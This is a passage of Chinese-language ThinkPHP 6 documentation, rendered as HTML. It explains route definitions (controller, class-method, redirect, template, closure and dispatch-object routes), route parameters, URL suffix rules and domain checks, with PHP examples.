</code></pre><p>&#x5982;&#x679C;&#x4E0D;&#x5B9A;&#x4E49;&#x8DEF;&#x7531;&#x6807;&#x8BC6;&#x7684;&#x8BDD;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x8DEF;&#x7531;&#x5730;&#x5740;&#x4F5C;&#x4E3A;&#x8DEF;&#x7531;&#x6807;&#x8BC6;&#xFF0C;&#x4F8B;&#x5982;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x65B9;&#x5F0F;&#x751F;&#x6210;</p>
<pre><code>url(&apos;News/read&apos;, [&apos;id&apos; =&gt; 10]);
</code></pre><h5 id="&#x5F3A;&#x5236;&#x8DEF;&#x7531;">&#x5F3A;&#x5236;&#x8DEF;&#x7531;</h5>
<p>&#x5728;&#x8DEF;&#x7531;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x8BBE;&#x7F6E;</p>
<pre><code>&apos;url_route_must&apos;        =&gt;  true,
</code></pre><p>&#x5C06;&#x5F00;&#x542F;&#x5F3A;&#x5236;&#x4F7F;&#x7528;&#x8DEF;&#x7531;&#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x4E0B;&#x9762;&#x5FC5;&#x987B;&#x4E25;&#x683C;&#x7ED9;&#x6BCF;&#x4E00;&#x4E2A;&#x8BBF;&#x95EE;&#x5730;&#x5740;&#x5B9A;&#x4E49;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#xFF08;<strong>&#x5305;&#x62EC;&#x9996;&#x9875;</strong>&#xFF09;&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x3002;</p>
<p>&#x9996;&#x9875;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x91C7;&#x7528;<code>/</code>&#x5B9A;&#x4E49;&#x5373;&#x53EF;&#xFF0C;&#x4F8B;&#x5982;&#x4E0B;&#x9762;&#x628A;&#x7F51;&#x7AD9;&#x9996;&#x9875;&#x8DEF;&#x7531;&#x8F93;&#x51FA;<code>Hello,world!</code></p>
<pre><code>Route::get(&apos;/&apos;, function () {
    return &apos;Hello,world!&apos;;
});
</code></pre><p>&#x8DEF;&#x7531;&#x5730;&#x5740;&#x8868;&#x793A;&#x5B9A;&#x4E49;&#x7684;&#x8DEF;&#x7531;&#x8868;&#x8FBE;&#x5F0F;&#x6700;&#x7EC8;&#x9700;&#x8981;&#x8DEF;&#x7531;&#x5230;&#x7684;&#x5B9E;&#x9645;&#x5730;&#x5740;&#xFF08;&#x6216;&#x8005;&#x54CD;&#x5E94;&#x5BF9;&#x8C61;&#xFF09;&#x4EE5;&#x53CA;&#x4E00;&#x4E9B;&#x9700;&#x8981;&#x7684;&#x989D;&#x5916;&#x53C2;&#x6570;&#xFF0C;&#x652F;&#x6301;&#x4E0B;&#x9762;&#x51E0;&#x79CD;&#x65B9;&#x5F0F;&#x5B9A;&#x4E49;&#xFF1A;</p>
<h5 id="&#x8DEF;&#x7531;&#x5230;&#x63A7;&#x5236;&#x5668;&#x64CD;&#x4F5C;">&#x8DEF;&#x7531;&#x5230;&#x63A7;&#x5236;&#x5668;/&#x64CD;&#x4F5C;</h5>
<p>&#x8FD9;&#x662F;&#x6700;&#x5E38;&#x7528;&#x7684;&#x4E00;&#x79CD;&#x8DEF;&#x7531;&#x65B9;&#x5F0F;&#xFF0C;&#x628A;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x8DEF;&#x7531;&#x5230;&#x76F8;&#x5173;&#x7684;&#x63A7;&#x5236;&#x5668;&#x548C;&#x64CD;&#x4F5C;&#xFF0C;&#x7136;&#x540E;&#x7531;&#x7CFB;&#x7EDF;&#x8C03;&#x5EA6;&#x6267;&#x884C;&#x76F8;&#x5173;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#xFF1A;</p>
<blockquote>
<h6 id="&#x63A7;&#x5236;&#x5668;&#x64CD;&#x4F5C;">&#x63A7;&#x5236;&#x5668;/&#x64CD;&#x4F5C;</h6>
</blockquote>
<p>&#x89E3;&#x6790;&#x89C4;&#x5219;&#x662F;&#x4ECE;&#x64CD;&#x4F5C;&#x5F00;&#x59CB;&#x89E3;&#x6790;&#xFF0C;&#x7136;&#x540E;&#x89E3;&#x6790;&#x63A7;&#x5236;&#x5668;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>// &#x8DEF;&#x7531;&#x5230;blog&#x63A7;&#x5236;&#x5668;
Route::get(&apos;blog/:id&apos;,&apos;Blog/read&apos;);
</code></pre><p>Blog&#x7C7B;&#x5B9A;&#x4E49;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>&lt;?php
namespace app\index\controller;

class Blog
{
    public function read($id)
    {
        return &apos;read:&apos; . $id;
    }
}
</code></pre><p>&#x8DEF;&#x7531;&#x5730;&#x5740;&#x4E2D;&#x652F;&#x6301;&#x591A;&#x7EA7;&#x63A7;&#x5236;&#x5668;&#xFF0C;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#xFF1A;</p>
<pre><code>Route::get(&apos;blog/:id&apos;,&apos;group.Blog/read&apos;);
</code></pre><p>&#x8868;&#x793A;&#x8DEF;&#x7531;&#x5230;&#x4E0B;&#x9762;&#x7684;&#x63A7;&#x5236;&#x5668;&#x7C7B;&#xFF0C;</p>
<pre><code>index/controller/group/Blog
</code></pre><p>&#x8FD8;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x8DEF;&#x7531;&#x5230;&#x52A8;&#x6001;&#x7684;&#x5E94;&#x7528;&#x3001;&#x63A7;&#x5236;&#x5668;&#x6216;&#x8005;&#x64CD;&#x4F5C;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>// action&#x53D8;&#x91CF;&#x7684;&#x503C;&#x4F5C;&#x4E3A;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x4F20;&#x5165;
Route::get(&apos;:action/blog/:id&apos;, &apos;Blog/:action&apos;);
</code></pre><h4 id="&#x8DEF;&#x7531;&#x5230;&#x7C7B;&#x7684;&#x65B9;&#x6CD5;">&#x8DEF;&#x7531;&#x5230;&#x7C7B;&#x7684;&#x65B9;&#x6CD5;</h4>
<p>&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x7684;&#x8DEF;&#x7531;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x6267;&#x884C;&#x4EFB;&#x4F55;&#x7C7B;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x800C;&#x4E0D;&#x5C40;&#x9650;&#x4E8E;&#x6267;&#x884C;&#x63A7;&#x5236;&#x5668;&#x7684;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x8DEF;&#x7531;&#x5730;&#x5740;&#x7684;&#x683C;&#x5F0F;&#x4E3A;&#xFF08;&#x52A8;&#x6001;&#x65B9;&#x6CD5;&#xFF09;&#xFF1A;</p>
<blockquote>
<h5 id="&#x5B8C;&#x6574;&#x7C7B;&#x540D;&#x65B9;&#x6CD5;&#x540D;">\&#x5B8C;&#x6574;&#x7C7B;&#x540D;@&#x65B9;&#x6CD5;&#x540D;</h5>
</blockquote>
<p>&#x6216;&#x8005;&#xFF08;&#x9759;&#x6001;&#x65B9;&#x6CD5;&#xFF09;</p>
<blockquote>
<h5 id="&#x5B8C;&#x6574;&#x7C7B;&#x540D;&#x65B9;&#x6CD5;&#x540D;">\&#x5B8C;&#x6574;&#x7C7B;&#x540D;::&#x65B9;&#x6CD5;&#x540D;</h5>
</blockquote>
<p>&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::get(&apos;blog/:id&apos;,&apos;\app\index\service\Blog@read&apos;);
</code></pre><p>&#x6267;&#x884C;&#x7684;&#x662F; <code>\app\index\service\Blog</code>&#x7C7B;&#x7684;<code>read</code>&#x65B9;&#x6CD5;&#x3002;
&#x4E5F;&#x652F;&#x6301;&#x6267;&#x884C;&#x67D0;&#x4E2A;&#x9759;&#x6001;&#x65B9;&#x6CD5;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::get(&apos;blog/:id&apos;,&apos;\app\index\service\Blog::read&apos;);
</code></pre><h4 id="&#x91CD;&#x5B9A;&#x5411;&#x8DEF;&#x7531;">&#x91CD;&#x5B9A;&#x5411;&#x8DEF;&#x7531;</h4>
<p>&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;<code>redirect</code>&#x65B9;&#x6CD5;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x91CD;&#x5B9A;&#x5411;&#x8DEF;&#x7531;</p>
<pre><code class="lang-php">Route::redirect(<span class="hljs-string">&apos;blog/:id&apos;</span>, <span class="hljs-string">&apos;http://blog.thinkphp.cn/read/:id&apos;</span>, <span class="hljs-number">302</span>);
</code></pre>
<h4 id="&#x8DEF;&#x7531;&#x5230;&#x6A21;&#x677F;">&#x8DEF;&#x7531;&#x5230;&#x6A21;&#x677F;</h4>
<p>&#x652F;&#x6301;&#x8DEF;&#x7531;&#x76F4;&#x63A5;&#x6E32;&#x67D3;&#x6A21;&#x677F;&#x8F93;&#x51FA;&#x3002;</p>
<pre><code>// &#x8DEF;&#x7531;&#x5230;&#x6A21;&#x677F;&#x6587;&#x4EF6;
Route::view(&apos;hello/:name&apos;, &apos;index/hello&apos;);
</code></pre><p>&#x8868;&#x793A;&#x8BE5;&#x8DEF;&#x7531;&#x4F1A;&#x6E32;&#x67D3;&#x5F53;&#x524D;&#x5E94;&#x7528;&#x4E0B;&#x9762;&#x7684;<code>view/index/hello.html</code>&#x6A21;&#x677F;&#x6587;&#x4EF6;&#x8F93;&#x51FA;&#x3002;</p>
<p>&#x6A21;&#x677F;&#x6587;&#x4EF6;&#x4E2D;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8F93;&#x51FA;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7684;<code>param</code>&#x53D8;&#x91CF;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x589E;&#x52A0;&#x989D;&#x5916;&#x7684;&#x6A21;&#x677F;&#x53D8;&#x91CF;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF1A;</p>
<pre><code>Route::view(&apos;hello/:name&apos;, &apos;index/hello&apos;, [&apos;city&apos;=&gt;&apos;shanghai&apos;]);
</code></pre><p>&#x5728;&#x6A21;&#x677F;&#x4E2D;&#x53EF;&#x4EE5;&#x8F93;&#x51FA;<code>name</code>&#x548C;<code>city</code>&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#x3002;</p>
<pre><code>Hello,{$name}--{$city}&#xFF01;
</code></pre><h4 id="&#x8DEF;&#x7531;&#x5230;&#x95ED;&#x5305;">&#x8DEF;&#x7531;&#x5230;&#x95ED;&#x5305;</h4>
<p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x95ED;&#x5305;&#x7684;&#x65B9;&#x5F0F;&#x5B9A;&#x4E49;&#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x9700;&#x6C42;&#x7684;&#x8DEF;&#x7531;&#xFF0C;&#x800C;&#x4E0D;&#x9700;&#x8981;&#x6267;&#x884C;&#x63A7;&#x5236;&#x5668;&#x7684;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x4E86;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::get(&apos;hello&apos;, function () {
    return &apos;hello,world!&apos;;
});
</code></pre><p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x95ED;&#x5305;&#x7684;&#x65B9;&#x5F0F;&#x652F;&#x6301;&#x8DEF;&#x7531;&#x81EA;&#x5B9A;&#x4E49;&#x54CD;&#x5E94;&#x8F93;&#x51FA;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::get(&apos;hello/:name&apos;, function () {
    response()-&gt;data(&apos;Hello,ThinkPHP&apos;)
    -&gt;code(200)
    -&gt;contentType(&apos;text/plain&apos;);
});
</code></pre><h4 id="&#x53C2;&#x6570;&#x4F20;&#x9012;">&#x53C2;&#x6570;&#x4F20;&#x9012;</h4>
<p>&#x95ED;&#x5305;&#x5B9A;&#x4E49;&#x7684;&#x65F6;&#x5019;&#x652F;&#x6301;&#x53C2;&#x6570;&#x4F20;&#x9012;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::get(&apos;hello/:name&apos;, function ($name) {
    return &apos;Hello,&apos; . $name;
});
</code></pre><p>&#x89C4;&#x5219;&#x8DEF;&#x7531;&#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x52A8;&#x6001;&#x53D8;&#x91CF;&#x7684;&#x540D;&#x79F0; &#x5C31;&#x662F;&#x95ED;&#x5305;&#x51FD;&#x6570;&#x4E2D;&#x7684;&#x53C2;&#x6570;&#x540D;&#x79F0;&#xFF0C;&#x4E0D;&#x5206;&#x6B21;&#x5E8F;&#x3002;</p>
<p>&#x56E0;&#x6B64;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x8BBF;&#x95EE;&#x7684;URL&#x5730;&#x5740;&#x662F;&#xFF1A;</p>
<pre><code>http://serverName/hello/thinkphp
</code></pre><p>&#x5219;&#x6D4F;&#x89C8;&#x5668;&#x8F93;&#x51FA;&#x7684;&#x7ED3;&#x679C;&#x662F;&#xFF1A;</p>
<pre><code>Hello,thinkphp
</code></pre><h4 id="&#x4F9D;&#x8D56;&#x6CE8;&#x5165;">&#x4F9D;&#x8D56;&#x6CE8;&#x5165;</h4>
<pre><code class="lang-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Inject</span>
</span>{
    <span class="hljs-keyword">protected</span> $one;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">(One $one)</span>
    </span>{
        $this-&gt;one = $one;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">return</span> $this-&gt;one-&gt;username;
    }
}
</code></pre>
<pre><code class="lang-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">One</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span>
</span>{
    <span class="hljs-keyword">public</span> $username = <span class="hljs-string">&quot;mr.Lee&quot;</span>;
}
</code></pre>
<p>&#x53EF;&#x4EE5;&#x5728;&#x95ED;&#x5305;&#x4E2D;&#x4F7F;&#x7528;&#x4F9D;&#x8D56;&#x6CE8;&#x5165;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::rule(&apos;hello/:name&apos;, function (Request $request, $name) {
    $method = $request-&gt;method();
    return &apos;[&apos; . $method . &apos;] Hello,&apos; . $name;
});
</code></pre><p><img src="https://s3.bmp.ovh/imgs/2023/01/31/88eb4776e941b2b5.png" alt=""><img src="https://s3.bmp.ovh/imgs/2023/01/31/8e8b6d7333e3c3a6.png" alt=""><img src="https://s3.bmp.ovh/imgs/2023/01/31/524e586d6cdeb327.png" alt=""></p>
<h4 id="&#x8DEF;&#x7531;&#x5230;&#x8C03;&#x5EA6;&#x5BF9;&#x8C61;&#xFF08;v603&#xFF09;">&#x8DEF;&#x7531;&#x5230;&#x8C03;&#x5EA6;&#x5BF9;&#x8C61;&#xFF08;<code>V6.0.3+</code>&#xFF09;</h4>
<p><code>V6.0.3+</code>&#x7248;&#x672C;&#x5F00;&#x59CB;&#xFF0C;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x8DEF;&#x7531;&#x5230;&#x4E00;&#x4E2A;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x8DEF;&#x7531;&#x8C03;&#x5EA6;&#x5BF9;&#x8C61;&#x3002;</p>
<pre><code>// &#x8DEF;&#x7531;&#x5230;&#x81EA;&#x5B9A;&#x4E49;&#x8C03;&#x5EA6;&#x5BF9;&#x8C61;
Route::get(&apos;blog/:id&apos;,\app\route\BlogDispatch::class);
namespace app\route;

use think\route\Dispatch;
use think\route\Rule;
use think\Request;

class BlogDispatch extends Dispatch
{
    public function exec()
    {
        // &#x81EA;&#x5B9A;&#x4E49;&#x8DEF;&#x7531;&#x8C03;&#x5EA6;
    }
}
</code></pre><p>&#x5177;&#x4F53;&#x8C03;&#x5EA6;&#x7C7B;&#x7684;&#x5B9E;&#x73B0;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x5185;&#x7F6E;&#x7684;&#x51E0;&#x4E2A;&#x8C03;&#x5EA6;&#x7C7B;&#x7684;&#x5B9E;&#x73B0;&#x3002;</p>
<h4 id="&#x8DEF;&#x7531;&#x53C2;&#x6570;">&#x8DEF;&#x7531;&#x53C2;&#x6570;</h4>
<p>&#x8DEF;&#x7531;&#x5206;&#x7EC4;&#x53CA;&#x89C4;&#x5219;&#x5B9A;&#x4E49;&#x652F;&#x6301;&#x6307;&#x5B9A;&#x8DEF;&#x7531;&#x53C2;&#x6570;&#xFF0C;&#x8FD9;&#x4E9B;&#x53C2;&#x6570;&#x4E3B;&#x8981;&#x5B8C;&#x6210;&#x8DEF;&#x7531;&#x5339;&#x914D;&#x68C0;&#x6D4B;&#x4EE5;&#x53CA;&#x540E;&#x7EED;&#x884C;&#x4E3A;&#x3002;</p>
<blockquote>
<p>&#x8DEF;&#x7531;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x5728;&#x5B9A;&#x4E49;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x7684;&#x65F6;&#x5019;&#x76F4;&#x63A5;&#x4F20;&#x5165;&#xFF08;&#x6279;&#x91CF;&#xFF09;&#xFF0C;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#x914D;&#x7F6E;&#x66F4;&#x52A0;&#x6E05;&#x6670;&#x3002;</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:left">&#x53C2;&#x6570;</th>
<th style="text-align:left">&#x8BF4;&#x660E;</th>
<th style="text-align:left">&#x65B9;&#x6CD5;&#x540D;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">ext</td>
<td style="text-align:left">URL&#x540E;&#x7F00;&#x68C0;&#x6D4B;&#xFF0C;&#x652F;&#x6301;&#x5339;&#x914D;&#x591A;&#x4E2A;&#x540E;&#x7F00;</td>
<td style="text-align:left">ext</td>
</tr>
<tr>
<td style="text-align:left">deny_ext</td>
<td style="text-align:left">URL&#x7981;&#x6B62;&#x540E;&#x7F00;&#x68C0;&#x6D4B;&#xFF0C;&#x652F;&#x6301;&#x5339;&#x914D;&#x591A;&#x4E2A;&#x540E;&#x7F00;</td>
<td style="text-align:left">denyExt</td>
</tr>
<tr>
<td style="text-align:left">https</td>
<td style="text-align:left">&#x68C0;&#x6D4B;&#x662F;&#x5426;https&#x8BF7;&#x6C42;</td>
<td style="text-align:left">https</td>
</tr>
<tr>
<td style="text-align:left">domain</td>
<td style="text-align:left">&#x57DF;&#x540D;&#x68C0;&#x6D4B;</td>
<td style="text-align:left">domain</td>
</tr>
<tr>
<td style="text-align:left">complete_match</td>
<td style="text-align:left">&#x662F;&#x5426;&#x5B8C;&#x6574;&#x5339;&#x914D;&#x8DEF;&#x7531;</td>
<td style="text-align:left">completeMatch</td>
</tr>
<tr>
<td style="text-align:left">model</td>
<td style="text-align:left">&#x7ED1;&#x5B9A;&#x6A21;&#x578B;</td>
<td style="text-align:left">model</td>
</tr>
<tr>
<td style="text-align:left">cache</td>
<td style="text-align:left">&#x8BF7;&#x6C42;&#x7F13;&#x5B58;</td>
<td style="text-align:left">cache</td>
</tr>
<tr>
<td style="text-align:left">ajax</td>
<td style="text-align:left">Ajax&#x68C0;&#x6D4B;</td>
<td style="text-align:left">ajax</td>
</tr>
<tr>
<td style="text-align:left">pjax</td>
<td style="text-align:left">Pjax&#x68C0;&#x6D4B;</td>
<td style="text-align:left">pjax</td>
</tr>
<tr>
<td style="text-align:left">json</td>
<td style="text-align:left">JSON&#x68C0;&#x6D4B;</td>
<td style="text-align:left">json</td>
</tr>
<tr>
<td style="text-align:left">validate</td>
<td style="text-align:left">&#x7ED1;&#x5B9A;&#x9A8C;&#x8BC1;&#x5668;&#x7C7B;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x9A8C;&#x8BC1;</td>
<td style="text-align:left">validate</td>
</tr>
<tr>
<td style="text-align:left">append</td>
<td style="text-align:left">&#x8FFD;&#x52A0;&#x989D;&#x5916;&#x7684;&#x53C2;&#x6570;</td>
<td style="text-align:left">append</td>
</tr>
<tr>
<td style="text-align:left">middleware</td>
<td style="text-align:left">&#x6CE8;&#x518C;&#x8DEF;&#x7531;&#x4E2D;&#x95F4;&#x4EF6;</td>
<td style="text-align:left">middleware</td>
</tr>
<tr>
<td style="text-align:left">filter</td>
<td style="text-align:left">&#x8BF7;&#x6C42;&#x53D8;&#x91CF;&#x8FC7;&#x6EE4;</td>
<td style="text-align:left">filter</td>
</tr>
<tr>
<td style="text-align:left">match</td>
<td style="text-align:left">&#x8DEF;&#x7531;&#x95ED;&#x5305;&#x68C0;&#x6D4B;&#xFF08;<code>V6.0.12+</code>&#xFF09;</td>
<td style="text-align:left">match</td>
</tr>
</tbody>
</table>
<h4 id="&#x4F2A;&#x9759;&#x6001;">&#x4F2A;&#x9759;&#x6001;</h4>
<p><a href="https://imgse.com/i/ppFyG0s" target="_blank"><img src="https://s1.ax1x.com/2023/03/02/ppFyG0s.png" alt="ppFyG0s.png"></a></p>
<pre><code class="lang-php">    <span class="hljs-string">&apos;url_html_suffix&apos;</span>       =&gt; <span class="hljs-string">&apos;html|htm&apos;</span>,
</code></pre>
<h4 id="&#x9884;&#x5904;&#x7406;--&#x53C2;&#x6570;&#x7ED1;&#x5B9A;&#xFF08;&#x9632;sql&#xFF09;">&#x9884;&#x5904;&#x7406; + &#x53C2;&#x6570;&#x7ED1;&#x5B9A;&#xFF08;&#x9632;SQL&#xFF09;</h4>
<p>&#x7528;&#x6CD5;&#x4E3E;&#x4F8B;&#xFF1A;</p>
<pre><code>Route::get(&apos;new/:id&apos;, &apos;News/read&apos;)
    -&gt;ext(&apos;html&apos;)
    -&gt;https();
</code></pre><blockquote>
<p>&#x8FD9;&#x4E9B;&#x8DEF;&#x7531;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x6DF7;&#x5408;&#x4F7F;&#x7528;&#xFF0C;&#x53EA;&#x8981;&#x6709;&#x4EFB;&#x4F55;&#x4E00;&#x6761;&#x53C2;&#x6570;&#x68C0;&#x67E5;&#x4E0D;&#x901A;&#x8FC7;&#xFF0C;&#x5F53;&#x524D;&#x8DEF;&#x7531;&#x5C31;&#x4E0D;&#x4F1A;&#x751F;&#x6548;&#xFF0C;&#x7EE7;&#x7EED;&#x68C0;&#x6D4B;&#x540E;&#x9762;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x3002;</p>
</blockquote>
<p>&#x5982;&#x679C;&#x4F60;&#x9700;&#x8981;&#x6279;&#x91CF;&#x8BBE;&#x7F6E;&#x8DEF;&#x7531;&#x53C2;&#x6570;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>option</code>&#x65B9;&#x6CD5;&#x3002;</p>
<pre><code>Route::get(&apos;new/:id&apos;, &apos;News/read&apos;)
    -&gt;option([
        &apos;ext&apos;   =&gt; &apos;html&apos;,
        &apos;https&apos; =&gt; true
    ]);
</code></pre><h4 id="url&#x540E;&#x7F00;">URL&#x540E;&#x7F00;</h4>
<blockquote>
<p>URL&#x540E;&#x7F00;&#x5982;&#x679C;&#x662F;&#x5168;&#x5C40;&#x7EDF;&#x4E00;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x8DEF;&#x7531;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x8BBE;&#x7F6E;<code>url_html_suffix</code>&#x53C2;&#x6570;&#xFF0C;&#x5982;&#x679C;&#x5F53;&#x524D;&#x8BBF;&#x95EE;&#x7684;URL&#x5730;&#x5740;&#x4E2D;&#x7684;URL&#x540E;&#x7F00;&#x662F;&#x5141;&#x8BB8;&#x7684;&#x4F2A;&#x9759;&#x6001;&#x540E;&#x7F00;&#xFF0C;&#x90A3;&#x4E48;&#x540E;&#x7F00;&#x672C;&#x8EAB;&#x662F;&#x4E0D;&#x4F1A;&#x88AB;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x503C;&#x4F20;&#x5165;&#x7684;&#x3002;</p>
</blockquote>
<p>&#x4E0D;&#x540C;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x7684;&#x533A;&#x522B;&#x5982;&#x4E0B;&#xFF1A;</p>
<table>
<thead>
<tr>
<th style="text-align:left">&#x914D;&#x7F6E;&#x503C;</th>
<th style="text-align:left">&#x63CF;&#x8FF0;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>false</code></td>
<td style="text-align:left">&#x7981;&#x6B62;&#x4F2A;&#x9759;&#x6001;&#x8BBF;&#x95EE;</td>
</tr>
<tr>
<td style="text-align:left">&#x7A7A;&#x5B57;&#x7B26;&#x4E32;</td>
<td style="text-align:left">&#x5141;&#x8BB8;&#x4EFB;&#x610F;&#x4F2A;&#x9759;&#x6001;&#x540E;&#x7F00;</td>
</tr>
<tr>
<td style="text-align:left"><code>html</code></td>
<td style="text-align:left">&#x53EA;&#x5141;&#x8BB8;&#x8BBE;&#x7F6E;&#x7684;&#x4F2A;&#x9759;&#x6001;&#x540E;&#x7F00;</td>
</tr>
<tr>
<td style="text-align:left">`html</td>
<td style="text-align:left">htm`</td>
<td>&#x5141;&#x8BB8;&#x591A;&#x4E2A;&#x4F2A;&#x9759;&#x6001;&#x540E;&#x7F00;</td>
</tr>
</tbody>
</table>
<pre><code>// &#x5B9A;&#x4E49;GET&#x8BF7;&#x6C42;&#x8DEF;&#x7531;&#x89C4;&#x5219; &#x5E76;&#x8BBE;&#x7F6E;URL&#x540E;&#x7F00;&#x4E3A;html&#x7684;&#x65F6;&#x5019;&#x6709;&#x6548;
Route::get(&apos;new/:id&apos;, &apos;News/read&apos;)
    -&gt;ext(&apos;html&apos;);
</code></pre><p>&#x652F;&#x6301;&#x5339;&#x914D;&#x591A;&#x4E2A;&#x540E;&#x7F00;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::get(&apos;new/:id&apos;, &apos;News/read&apos;)
    -&gt;ext(&apos;shtml|html&apos;);
</code></pre><blockquote>
<p>&#x5982;&#x679C;<code>ext</code>&#x65B9;&#x6CD5;&#x4E0D;&#x4F20;&#x5165;&#x4EFB;&#x4F55;&#x503C;&#xFF0C;&#x8868;&#x793A;&#x4E0D;&#x5141;&#x8BB8;&#x4F7F;&#x7528;&#x4EFB;&#x4F55;&#x540E;&#x7F00;&#x8BBF;&#x95EE;&#x3002;</p>
</blockquote>
<p>&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x7981;&#x6B62;&#x8BBF;&#x95EE;&#x7684;URL&#x540E;&#x7F00;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>// &#x5B9A;&#x4E49;GET&#x8BF7;&#x6C42;&#x8DEF;&#x7531;&#x89C4;&#x5219; &#x5E76;&#x8BBE;&#x7F6E;&#x7981;&#x6B62;URL&#x540E;&#x7F00;&#x4E3A;png&#x3001;jpg&#x548C;gif&#x7684;&#x8BBF;&#x95EE;
Route::get(&apos;new/:id&apos;, &apos;News/read&apos;)
    -&gt;denyExt(&apos;jpg|png|gif&apos;);
</code></pre><blockquote>
<p>&#x5982;&#x679C;<code>denyExt</code>&#x65B9;&#x6CD5;&#x4E0D;&#x4F20;&#x5165;&#x4EFB;&#x4F55;&#x503C;&#xFF0C;&#x8868;&#x793A;&#x5FC5;&#x987B;&#x4F7F;&#x7528;&#x540E;&#x7F00;&#x8BBF;&#x95EE;&#x3002;</p>
</blockquote>
<h4 id="&#x57DF;&#x540D;&#x68C0;&#x6D4B;">&#x57DF;&#x540D;&#x68C0;&#x6D4B;</h4>
<p>&#x652F;&#x6301;&#x4F7F;&#x7528;&#x5B8C;&#x6574;&#x57DF;&#x540D;&#x6216;&#x8005;&#x5B50;&#x57DF;&#x540D;&#x8FDB;&#x884C;&#x68C0;&#x6D4B;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>// &#x5B8C;&#x6574;&#x57DF;&#x540D;&#x68C0;&#x6D4B; &#x53EA;&#x5728;news.thinkphp.cn&#x8BBF;&#x95EE;&#x65F6;&#x8DEF;&#x7531;&#x6709;&#x6548;
Route::get(&apos;new/:id&apos;, &apos;News/read&apos;)
    -&gt;domain(&apos;news.thinkphp.cn&apos;);
// &#x5B50;&#x57DF;&#x540D;&#x68C0;&#x6D4B;
Route::get(&apos;new/:id&apos;, &apos;News/read&apos;)
    -&gt;domain(&apos;news&apos;);
</code></pre><blockquote>
